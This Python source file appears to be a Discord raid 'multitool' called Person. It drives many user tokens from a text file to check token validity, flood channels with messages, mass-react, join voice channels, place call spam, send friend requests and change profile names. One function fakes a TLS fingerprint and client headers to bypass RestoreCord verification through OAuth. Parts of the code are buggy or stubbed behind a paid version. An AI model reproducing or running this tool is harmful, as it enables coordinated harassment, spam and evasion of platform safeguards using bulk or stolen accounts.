import time
import json
import random
import requests
import websocket
import threading
import tls_client
from os import system

def get_file(file_name) -> list:
	"""
	Simply returns the data of personmulti/data/{textfile}.txt

	Example:

	  Given the data inside of tokens.txt is this:

		abcdefghijklmnop
		pomnioiqyfiqwauo


	  get_tokens will return -> ['abcdefghijklmnop', 'pomnioiqyfiqwauo']
	"""
	return [line.replace("\n", '') for line in open(f"data/{file_name}.txt")]


def clear_screen() -> None:
	return system("cls")


def home_page(RED, WHITE) -> None:
	clear_screen()

	home_page = f"""
{RED}
					██████╗ ███████╗██████╗ ███████╗ ██████╗ ███╗   ██╗
					██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║
					██████╔╝█████╗  ██████╔╝███████╗██║   ██║██╔██╗ ██║
					██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║   ██║██║╚██╗██║
					██║     ███████╗██║  ██║███████║╚██████╔╝██║ ╚████║
					╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
{WHITE}
	"""

	print("   " + home_page)

	print(f"""
{RED}«{WHITE}01{RED}»{WHITE}  Joiner         {RED}«{WHITE}08{RED}»{WHITE}  Reaction on Bomber     {RED}«{WHITE}15{RED}»{WHITE}  Name Changer        {RED}«{WHITE}22{RED}»{WHITE}  Button Clicker
{RED}«{WHITE}02{RED}»{WHITE}  Leaver         {RED}«{WHITE}09{RED}»{WHITE}  Emoji Reactor          {RED}«{WHITE}16{RED}»{WHITE}  Nick Changer        {RED}«{WHITE}23{RED}»{WHITE}  Friend Spam
{RED}«{WHITE}03{RED}»{WHITE}  Checker        {RED}«{WHITE}10{RED}»{WHITE}  Thread Flooder         {RED}«{WHITE}17{RED}»{WHITE}  RestoreCorder       {RED}«{WHITE}24{RED}»{WHITE}  Accept Rules 
{RED}«{WHITE}04{RED}»{WHITE}  Spammer        {RED}«{WHITE}11{RED}»{WHITE}  VoiceChat Joiner       {RED}«{WHITE}18{RED}»{WHITE}  SelfScrapper        {RED}«{WHITE}25{RED}»{WHITE}  Guild Check
{RED}«{WHITE}05{RED}»{WHITE}  Inviter        {RED}«{WHITE}12{RED}»{WHITE}  Soundboard Spammer     {RED}«{WHITE}19{RED}»{WHITE}  Boost Server        {RED}«{WHITE}26{RED}»{WHITE}  Token Captcher
{RED}«{WHITE}06{RED}»{WHITE}  Typing         {RED}«{WHITE}13{RED}»{WHITE}  Token Fomatter         {RED}«{WHITE}20{RED}»{WHITE}  DM Spammer          {RED}«{WHITE}27{RED}»{WHITE}  Ticket Spam
{RED}«{WHITE}07{RED}»{WHITE}  Mass DM        {RED}«{WHITE}14{RED}»{WHITE}  BIO Changer            {RED}«{WHITE}21{RED}»{WHITE}  Call Spammer        {RED}«{WHITE}>>{RED}»{WHITE}  Next Page
	""")


def gen_headers(token):
	return {'authority': 'discord.com', 'accept': '*/*', 'accept-language': 'fr-FR,fr;q=0.9','authorization': token,'cache-control': 'no-cache','content-type': 'application/json','cookie': '__dcfduid=676e06b0565b11ed90f9d90136e0396b; __sdcfduid=676e06b1565b11ed90f9d90136e0396bc28dfd451bebab0345b0999e942886d8dfd7b90f193729042dd3b62e2b13812f; __cfruid=1cefec7e9c504b453c3f7111ebc4940c5a92dd08-1666918609; locale=en-US','origin': 'https://discord.com','pragma': 'no-cache','referer': 'https://discord.com/channels/@me','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'en-US', 'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlcGVhc2VfY2hhbm5lcCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE1NDc1MCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',}

def bypassheaders(token):  
		headers = {
		'authority': 'discord.com',
		'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDExIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MjEiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTc5ODgyLCJuYXRpdmVfYnVpbGRfbnVtYmVyIjozMDMwNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
		'x-discord-locale': 'en',
		'x-debug-options': 'bugReporterEnabled',
		'accept-language': 'en',
		'authorization': token,
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9011 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
		'content-type': 'application/json',
		'accept': '*/*',
		'origin': 'https://discord.com',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-mode': 'cors',
		'sec-fetch-dest': 'empty',
		 }
		return headers


def joiner(RED, WHITE, invite, TOKENS, proxies=None, delay=1):
	... # src available in premium...


def leaver(RED, WHITE, TOKENS, guild_id, delay=1):
	... # src available in premium...


def checker(RED, WHITE, TOKENS):
	clear_screen()
	current_time = time.localtime()
	formatted_time = f"{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}"
	if len(TOKENS) == 0:
		print(f"{formatted_time} [ERROR]     ->   Put tokens to data/tokens.txt")
	else:
		for token in TOKENS:
			headers = gen_headers(token)
			try:
				response = requests.get(f"https://discord.com/api/v10/users/@me/library", headers=headers)
				token_prefix = token.split(".")[0]

				if response.status_code == 200:
					print(f"{formatted_time} {RED}[VALID]{WHITE}   ->   {token_prefix}{RED}****{WHITE}")
					with open('data/valid.txt', 'a') as valid_file:
						valid_file.write(token + '\n')

				elif response.status_code == 403:
					print(f"{formatted_time} {RED}[LOCKED]{WHITE}   ->   {token_prefix}{RED}****{WHITE}")

				else:
					print(f"{formatted_time} {RED}[INVALID]{WHITE}   ->   {token_prefix}{RED}****{WHITE}")
			
			except Exception as e:
				print(f"{formatted_time} {RED}[ERROR]{WHITE}     ->   {e}")

	input(f"\r\n\r\n\r\n{RED}Click enter to {WHITE}continue...")
	home_page(RED, WHITE)


def msg_spammer(TOKENS, message, channelid, delay):
	data = {
		"content": message
	}

	while True:
		time.sleep(delay * 0.1)
		for token in TOKENS:
			headers = gen_headers(token)
			current_time = time.localtime()
			formatted_time = f"{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}"

			try:
				response = requests.post(f"https://discord.com/api/v10/channels/{channelid}/messages", timeout=1.5, headers=headers, json=data)
				token_prefix = token.split(".")[0]

				if response.status_code == 200:
					print(f"{formatted_time} [SUCCESS] ->   Successfully sent {token_prefix}****")
				elif response.status_code == 403:
					print(f"{formatted_time} [ERROR]   ->   Failed {token_prefix}****  {response.text}")
			except Exception as e:
				print(f"{formatted_time} [ERROR]   ->   {e}")


def inviter(RED, WHITE, TOKENS, channel_id):
	current_time = time.localtime()
	formatted_time = f"{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}"
	for token in TOKENS:
		headers = gen_headers(token)
		data = {"max_age": random.randint(1, 86400), "max_uses": 0}

		try:
			rr = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/invites", headers=headers, json=data); token = token.split(".")[0]

			if rr.status_code == 200:
				print(f"{formatted_time}{RED}    {WHITE}[SUCCESS]   {RED}->   Created invite {WHITE}{token}{RED}****") 
			else:
				print(f"{formatted_time}{RED}    {WHITE}[ERROR]     {RED}->    Failed {WHITE}{token}{RED}****  {WHITE}{rr.text}{RED}")

		except Exception as e:
			print(e)

def typing(RED, WHITE, TOKENS, channel_id):
	for token in TOKENS:
		headers = gen_headers(token)
		token_prefix = token.split(".")[0]
		current_time = time.localtime()
		formatted_time = f"{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}"

		try:
			rr = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/typing", headers=headers, json={})

			if rr.status_code == 204:
				print(f"{formatted_time} {RED}[SUCCESS]{WHITE} -> Typing {RED}{token_prefix}****{WHITE}")

			else:
				print(f"{formatted_time} {RED}[ERROR]{WHITE} -> Failed {token_prefix}**** {RED}{rr.text}{WHITE}")

		except Exception as e:
			print(f"{formatted_time} {RED}[ERROR]{WHITE} -> {e}")


def emoji_bomber(TOKENS, channel_id, message_id, emoji):
	"""Bomb a message with emojis using multiple tokens."""
	for token in TOKENS:
		headers = gen_headers(token)
		token_prefix = token.split(".")[0]
		current_time = time.localtime()
		formatted_time = f"{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}"

		try:
			url = f"https://discord.com/api/v10/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me?location=Message&type=0"
			rr = requests.put(url, headers=headers, json={})

			if rr.status_code == 204:
				print(f"{formatted_time} {RED}[SUCCESS]{WHITE} -> Bombed {RED}{token_prefix}****{WHITE}")
			else:
				print(f"{formatted_time} {RED}[ERROR]{WHITE} -> Failed {RED}{token_prefix}****{WHITE} {rr.text}")
		except Exception as e:
			print(f"{current_time} {RED}[ERROR]{WHITE} -> {e}")

def reactor(RED, WHITE, TOKENS, channel_id, message_id, emoji):
	clear_screen()
	for token in TOKENS:
		current_time = time.localtime()
		formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"
		url = f"https://discord.com/api/v10/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me?location=Message&type=0"
		headers = gen_headers(token)
		token_prefix = token.split(".")[0]

		try:
			response = requests.put(url, headers=headers, json={})

			if response.status_code == 204:
				print(f"{formatted_time}     {RED}[SUCCESS]   {WHITE}->    {RED}Reacted {WHITE}{token}{RED}****{WHITE}")
			else:
				print(f"{formatted_time}     {RED}[ERROR]     {WHITE}->    {RED}Failed {WHITE}{token}{RED}****{WHITE}  {response.text}")


		except Exception as e:
			print(f"An exception occurred: {e}")

def vcjoiner(RED, WHITE, TOKENS, server, channel):
	clear_screen()
	for token in TOKENS:
		token_prefix = token.split(".")[0]
		time.sleep(1)

		ws = websocket.WebSocket()
		ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")

		payload1 = {
		"op": 2,
		"d": {
			"token": token,
			"properties": {
				"$os": "windows",
				"$browser": "Discord",
				"$device": "desktop"
			}
		}
	}


		payload2 = {
		"op": 4,
		"d": {
			"guild_id": server,
			"channel_id": channel,
			"self_mute": False,
			"self_deaf": False
		}
		}
	
		ws.send(json.dumps(payload1))
		ws.send(json.dumps(payload2))
	
		current_time = time.localtime()
		formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"
		print(f"{formatted_time} [JOINED] -> Successfully connected {token_prefix}****")


def biochanger(RED, WHITE, TOKENS, bio):
	"""Change the bio of a Discord user."""
	clear_screen()
	data = {"bio": bio}
	current_time = time.localtime()
	formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"

	for token in TOKENS:
		try:
			headers = gen_headers(token)
			url = "https://discord.com/api/v9/users/@me/profile"
			rr = requests.patch(url, headers=headers, json=data)
			token_prefix = token.split(".")[0]

			if rr.status_code == 200:
				print(f"{formatted_time} {RED}[SUCCESS] {WHITE}-> {RED}Changed {WHITE}{token_prefix}{RED}****{WHITE}")
			else:
				print(f"{formatted_time} {RED}[ERROR] {WHITE}-> {RED}Failed {WHITE}{token_prefix}{RED}****{WHITE} {RED}{rr.text}{WHITE}")

		except Exception as e:
			print(f"{formatted_time} {RED}[ERROR] {WHITE}-> {RED}Exception occurred:{WHITE} {e}")

	input(f"\r\n\r\n\r\n{RED}Click enter to {WHITE}continue...")
	home_page(RED, WHITE)

def namechanger(RED, WHITE, TOKENS, nickname):
	"""Change the global nickname of a Discord user."""
	clear_screen()
	payload = {'global_name': nickname}
	current_time = time.localtime()
	formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"

	for token in TOKENS:
		try:
			headers = gen_headers(token)
			current_time = time.localtime()
			formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"
			url = "https://discord.com/api/v10/users/@me"
			rr = requests.patch(url, headers=headers, json=payload)
			token_prefix = token.split(".")[0]

			if rr.status_code == 200:
				print(f"{formatted_time} {RED}[SUCCESS] {WHITE}-> Changed {token_prefix}{RED}****{WHITE}")
			else:
				print(f"{formatted_time} {RED}[ERROR] {WHITE}-> Failed {token_prefix}{RED}****{WHITE} {RED}{rr.text}{WHITE}")

		except Exception as e:
			print(f"{formatted_time} {RED}{Fore.MAGENTA}[ERROR] {WHITE}-> {RED}Exception occurred:{WHITE} {e}")

	input(f"\r\n\r\n\r\n{RED}Click enter to {WHITE}continue...")
	home_page(RED, WHITE)


def nickchanger(TOKENS, server, nickname):
	"""Change the nickname of a Discord user in a specific server."""
	payload = {'nick': nickname}
	current_time = datetime.datetime.now().strftime('%H:%M:%S')

	for token in TOKENS:
		try:
			current_time = time.localtime()
			formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"
			headers = gen_headers(t)
			url = f"https://discord.com/api/v10/guilds/{server}/members/@me"
			rr = requests.patch(url, headers=headers, json=payload)
			token_prefix = t.split(".")[0]

			if rr.status_code == 200:
				print(f"{current_time} {Fore.RESET}{Fore.MAGENTA}[SUCCESS] {Fore.LIGHTBLACK_EX}-> {Fore.RESET}Changed {Fore.MAGENTA}{token_prefix}{Fore.LIGHTBLACK_EX}****{Fore.RESET}")
			else:
				print(f"{current_time} {Fore.RESET}{Fore.MAGENTA}[ERROR] {Fore.LIGHTBLACK_EX}-> {Fore.RESET}Failed {Fore.MAGENTA}{token_prefix}{Fore.LIGHTBLACK_EX}****{Fore.RESET} {Fore.LIGHTBLACK_EX}{rr.text}{Fore.RESET}")
		except Exception as e:
			print(f"{current_time} {Fore.RESET}{Fore.MAGENTA}[ERROR] {Fore.LIGHTBLACK_EX}-> {Fore.RESET}Exception occurred: {e}")

	input(f"\r\n\r\n\r\n{RED}Click enter to {WHITE}continue...")
	home_page(RED, WHITE)


def restorecord_bypass(RED, WHITE, guild_id, bot_id, TOKENS):
	clear_screen()
	for token in TOKENS:
		session = tls_client.Session(
			client_identifier="chrome_108",
			ja3_string="771,4866-4867-4865-103-49200-49187-158-49188-49161-49171-61-49195-49199-156-60-49192-51-53-49172-49191-52392-49162-107-52394-49196-159-47-57-157-52393-255,0-11-10-35-16-22-23-13-43-45-51-21,29-23-30-25-24,0-1-2",
			h2_settings={
				"HEADER_TABLE_SIZE": 65536,
				"MAX_CONCURRENT_STREAMS": 1000,
				"INITIAL_WINDOW_SIZE": 6291456,
				"MAX_HEADER_LIST_SIZE": 262144
			},
			h2_settings_order=[
				"HEADER_TABLE_SIZE",
				"MAX_CONCURRENT_STREAMS",
				"INITIAL_WINDOW_SIZE",
				"MAX_HEADER_LIST_SIZE"
			],
			supported_signature_algorithms=[
				"ECDSAWithP256AndSHA256",
				"PSSWithSHA256",
				"PKCS1WithSHA256",
				"ECDSAWithP384AndSHA384",
				"PSSWithSHA384",
				"PKCS1WithSHA384",
				"PSSWithSHA512",
				"PKCS1WithSHA512",
			],
			supported_versions=["GREASE", "1.3", "1.2"],
			key_share_curves=["GREASE", "X25519"],
			cert_compression_algo="brotli",
			pseudo_header_order=[
				":method",
				":authority",
				":scheme",
				":path"
			],
			connection_flow=15663105,
			header_order=[
				"accept",
				"user-agent",
				"accept-encoding",
				"accept-language"
			]
		)

		headers = bypassheaders(token)
		querystring = {
			"client_id": str(bot_id),
			"response_type": "code",
			"redirect_uri": "https://restorecord.com/api/callback",
			"scope": "identify guilds.join",
			"state": str(guild_id)
		}

		request = requests.post(
			"https://discord.com/api/v9/oauth2/authorize",
			headers=headers,
			params=querystring,
			json={"permissions": "0", "authorize": True}
		)

		current_time = time.localtime()
		formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"

		if "location" in request.text:
			answer = request.json()["location"]
			result = requests.get(answer, headers=headers, allow_redirects=True)

			if result.status_code in [307, 403, 200]:
				print(f"{formatted_time}    {RED}[SUCCESS]   {WHITE}->   Bypassed {RED}{token}{WHITE}****")
			elif result.status_code == 400:
				print(f"{formatted_time}    {RED}[ERROR]     {WHITE}->    Captched {RED}RIP SOLDIERS{WHITE}")
			else:
				print(f"{formatted_time}    {RED}[ERROR]     {WHITE}->    Failed {RED}{token}{WHITE}****{WHITE}  {result.text}")
		else:
			print(f"{formatted_time}    {RED}[ERROR]     {WHITE}->    Discord don't like you {RED}{token}{WHITE}****  {request.text}{WHITE}")

	input(f"\r\n\r\n\r\n{RED}Click enter to {WHITE}continue...")
	home_page(RED, WHITE)

def callstart(RED, WHITE, TOKENS, user_id):
	clear_screen()
	for token in TOKENS:
		current_time = time.localtime()
		formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"
		user_id = str(user_id)
		headers = gen_headers(token)
		payload = {'recipients': user_id}

		try:
			rr = requests.get(
				f"https://discord.com/api/v9/users/@me/channels",
				headers=headers,
				json=payload
			)
			token = token.split(".")[0]

			if rr.status_code == 200:
				print(f"{formatted_time}    {RED}[SUCCESS]   {WHITE}->   Open {RED}{token}{WHITE}****")
			else:
				print(f"{formatted_time}    {RED}[ERROR]     {WHITE}->    Failed {RED}{token}{WHITE}****  {RED}status {rr.status_code}{WHITE}")
		except:
			pass

	input(f"\r\n\r\n\r\n{RED}Click enter to {WHITE}continue...")
	home_page(RED, WHITE)


def call(RED, WHITE, TOKENS, user_id):
    clear_screen()
    for t in TOKENS:
        current_time = time.localtime()
        formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"
        token = t.split(".")[0]
        time.sleep(1)

        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
        hello = json.loads(ws.recv())

        ws.send(json.dumps({
            "op": 2,
            "d": {
                "token": t,
                "properties": {
                    "$os": "windows",
                    "$browser": "Discord",
                    "$device": "desktop"
                }
            }
        }))

        ws.send(json.dumps({
            "op": 4,
            "d": {
                "guild_id": None,
                "channel_id": str(user_id),
                "self_mute": False,
                "self_deaf": False,
                "self_stream": False,
                "self_video": False
            }
        }))

        ws.send(json.dumps({
            "op": 18,
            "d": {
                "type": "guild",
                "guild_id": None,
                "channel_id": str(user_id),
                "preferred_region": "singapore"
            }
        }))

        ws.send(json.dumps({
            "op": 1,
            "d": None
        }))

        ws.send(json.dumps({
            "op": 4,
            "d": {
                "guild_id": None,
                "channel_id": None,
                "self_mute": True,
                "self_deaf": False,
                "self_video": False
            }
        }))

        print(f"{formatted_time}    {RED}[JOINED]     ->    {WHITE}Successfully connected {RED}{token}{WHITE}****")


def friender(RED, WHITE, TOKENS, user, type1):
    clear_screen()
    if type1.lower() == "add":
        user = user.split("#")
        payload = {
            "username": user[0], 
            "discriminator": user[1]
        }
    for t in TOKENS:
        current_time = time.localtime()
        formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"
        headers = gen_headers(t)
        token = t.split(".")[0]
        
        try:
            if type1 == "add":
                response = requests.post(
                    "https://discordapp.com/api/v10/users/@me/relationships", 
                    headers=headers, 
                    json=payload
                )
            elif type1 == "rem":
                response = requests.delete(
                    f"https://discord.com/api/v10/users/@me/relationships/{user[1]}", 
                    headers=headers
                )
            else:
                print(f"{formatted_time} {RED}[ERROR]{WHITE} -> Invalid type: {RED}{type1}{WHITE}")
                return
            
            if response.status_code == 204:
                print(f"{formatted_time} {RED}[SUCCESS]{WHITE} -> Operation successful for {RED}{token}****{WHITE}")
            else:
                print(f"{formatted_time} {RED}[ERROR]{WHITE} -> Error {RED}{token}****{WHITE} {response.text}")
        except Exception as e:
            print(f"{formatted_time} {RED}[ERROR]{WHITE} -> Exception: {RED}{str(e)}{WHITE}")


    input(f"\r\n\r\n\r\n{RED}Click enter to {WHITE}continue...")
    home_page(RED, WHITE)









def handle_commands(RED, WHITE, TOKENS, PROXIES=None):
	print("\r\n\r\n\r\n")
	while True:
		current_time = time.localtime()
		formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"

		while True:
			try:
				bf_cmd = input(f"{formatted_time}{WHITE} -> ")
				cmd = int(bf_cmd)

			except KeyboardInterrupt:
				exit(f"\r\n\r\n\r\n{RED}[PERSON] You are now exitting {WHITE}person{RED}, goodbye!")

			except:
				if type(bf_cmd) == str and bf_cmd.lower() not in ["c", "cls", "clear", "exit"]:
					print(f"{RED}Try Typing a number {WHITE}e.g 5")
					continue
				elif bf_cmd.lower() in ["c", "cls", "clear"]:
					clear_screen()
					home_page(RED, WHITE)
					handle_commands(RED, WHITE, TOKENS, PROXIES=PROXIES)
					return 0;
				else:
					exit(f"\r\n\r\n\r\n{RED}[PERSON] You are now exitting {WHITE}person{RED}, goodbye!")

			else:
				break

		if cmd == 1:
			print(f"{RED}This command is only available on the {WHITE}paid version{RED} of this tool, join {WHITE}discord.gg/person{RED} to buy.")

		elif cmd == 2:
			print(f"{RED}This command is only available on the {WHITE}paid version{RED} of this tool, join {WHITE}discord.gg/person{RED} to buy.")

		elif cmd == 3:
			checker(RED, WHITE, TOKENS)

		elif cmd == 4:
			message    = input(f"{RED}[Message e.g {WHITE}raided by .gg/person{RED}]{WHITE} -> ")
			channel_id = int(input(f"{RED}[Channel ID e.g {WHITE}1245590078168760404{RED}]{WHITE} -> "))
			try:
				delay  = int(input(f"{RED}[Delay (Click enter for {WHITE}default=1{RED})]{WHITE} -> "))
			except:
				delay  = 1
			

			msg_spammer(TOKENS, message, channel_id, delay)

		elif cmd == 5:
			channel_id = int(input(f"{RED}[Channel ID e.g {WHITE}1245590078168760404{RED}]{WHITE} -> "))
			inviter(RED, WHITE, TOKENS, channel_id)

		elif cmd == 6:
			channel_id = int(input(f"{RED}[Channel ID e.g {WHITE}1245590078168760404{RED}]{WHITE} -> "))
			typing(RED, WHITE, TOKENS, channel_id)

		elif cmd == 7:
			print(f"MassDM {RED}is only available in Premium, Buy it from {WHITE}discord.gg/person")

		elif cmd == 8:
			channel_id = int(input(f"{RED}[Channel ID e.g {WHITE}1245590078168760404{RED}]{WHITE} -> "))
			message_id = int(input(f"{RED}[Message ID e.g {WHITE}1245590078168760403{RED}]{WHITE} -> "))

		elif cmd == 9:
			channel_id = int(input(f"{RED}[Channel ID e.g {WHITE}1245590078168760404{RED}]{WHITE} -> "))
			message_id = int(input(f"{RED}[Message ID e.g {WHITE}1245590078168760403{RED}]{WHITE} -> "))
			emoji = input(f"{RED}[Emoji Choice e.g {WHITE}🦶{RED}]{WHITE} -> ")
			reactor(RED, WHITE, TOKENS, channel_id, message_id, emoji=emoji)

		elif cmd == 10:
			message    = input(f"{RED}[Message e.g {WHITE}raided by .gg/person{RED}]{WHITE} -> ")
			channel_id = int(input(f"{RED}[Channel ID e.g {WHITE}1245590078168760404{RED}]{WHITE} -> "))
			try:
				delay  = int(input(f"{RED}[Delay (Click enter for {WHITE}default=1{RED})]{WHITE} -> "))
			except:
				delay  = 1
			

			msg_spammer(TOKENS, message, channel_id, delay)

		elif cmd == 11:
			guild_id   = input(f"{RED}[Guild ID e.g {WHITE}218098372169912710{RED}]{WHITE} -> ")
			channel_id = int(input(f"{RED}[Channel ID e.g {WHITE}1245590078168760404{RED}]{WHITE} -> "))
			vcjoiner(RED, WHITE, TOKENS, guild_id, channel_id)

		elif cmd == 12:
			print(f"{RED}This command is only available on the {WHITE}paid version{RED} of this tool, join {WHITE}discord.gg/person{RED} to buy.")

		elif cmd == 13:
			try:
				clean = []
				clear_screen()

				# Read tokens from file and clean them
				with open("data/tokens.txt", "r") as f:
					lines = f.read().splitlines()
					for line in lines:
						split = line.split(":")
						clean.append(split[2])

				# Write cleaned tokens back to the file
				with open("data/tokens.txt", "w") as f:
					for token in clean:
						f.write(f"{token}\n")

		# Print success message
				current_time = time.localtime()
				formatted_time = f"{RED}[Person@{WHITE}{current_time.tm_hour:02d}:{current_time.tm_min:02d}:{current_time.tm_sec:02d}{RED}]"
				print(f"{formatted_time}    {RED}[SUCCESS]   {WHITE}->   {RED}Formatted Tokens Successfully, Please restart the multitool.")
				input(f"\r\n\r\n\r\n{RED}Click enter to {WHITE}continue...")
				home_page(RED, WHITE)
			except Exception as e:
				print(f"{formatted_time}    {RED}[ERROR]   {WHITE}->   {RED}Failed to format tokens:{WHITE} Your tokens are either already formatted or are using an unrecognised syntax.")
				input(f"\r\n\r\n\r\n{RED}Click enter to {WHITE}continue...")
				home_page(RED, WHITE)

		elif cmd == 14:
			bio = input(f"{RED}[bio e.g {WHITE}hi this is my cute bio{RED}]{WHITE} -> ")
			biochanger(RED, WHITE, TOKENS, bio)

		elif cmd == 15:
			nickname = input(f"{RED}[new name e.g {WHITE}hi this is my new name{RED}]{WHITE} -> ")
			namechanger(RED, WHITE, TOKENS, nickname)

		elif cmd == 16:
			nickname = input(f"{RED}[new nickname e.g {WHITE}hi this is my new nickname{RED}]{WHITE} -> ")
			guild_id = input(f"{RED}[Guild ID e.g {WHITE}218098372169912710{RED}]{WHITE} -> ")
			nickchanger(TOKENS, guild_id, nickname)

		elif cmd == 17:
			guild_id = input(f"{RED}[Guild ID e.g {WHITE}218098372169912710{RED}]{WHITE} -> ")
			bot_id = input(f"{RED}[Bot ID e.g {WHITE}4394329847329847923{RED}]{WHITE} -> ")
			restorecord_bypass(RED, WHITE, guild_id, bot_id, TOKENS)

		elif cmd == 18:
			print(f"{RED}This command is only available on the {WHITE}paid version{RED} of this tool, join {WHITE}discord.gg/person{RED} to buy.")

		elif cmd == 19:
			print(f"{RED}This command is only available on the {WHITE}paid version{RED} of this tool, join {WHITE}discord.gg/person{RED} to buy.")

		elif cmd == 20:
			print(f"{RED}Ah, you got us, {WHITE}we're still working on releasing this one...")

		elif cmd == 21:
			user_id = input(f"{RED}[User ID e.g {WHITE}218098372169912710{RED}]{WHITE} -> ")
			call(RED, WHITE, TOKENS, user_id)
			callstart(RED, WHITE, TOKENS, user_id)


		elif cmd == 22:
			print(f"{RED}Ah, you got us, {WHITE}we're still working on releasing this one...")

		elif cmd == 23:
			type1 = input(f"{RED}[Type {WHITE}e.g add/del{RED}] -> ")
			user = input(f"{RED}[Nickname {WHITE}e.g rooben#0{RED}] -> ") if type1.lower() == "add" else input(f"{RED}[UserID {WHITE}e.g 32981739880137{RED}] ->")
			friender(RED, WHITE, TOKENS, user, type1)

		elif cmd == 24:
			print(f"{RED}Ah, you got us, {WHITE}we're still working on releasing this one...")

		elif cmd == 25:
			print(f"{RED}Ah, you got us, {WHITE}we're still working on releasing this one...")

		elif cmd == 26:
			print(f"{RED}Ah, you got us, {WHITE}we're still working on releasing this one...")

		elif cmd == 27:
			print(f"{RED}Ah, you got us, {WHITE}we're still working on releasing this one...")

		else:
			print(f"{RED}Unrecognised {WHITE}command.")
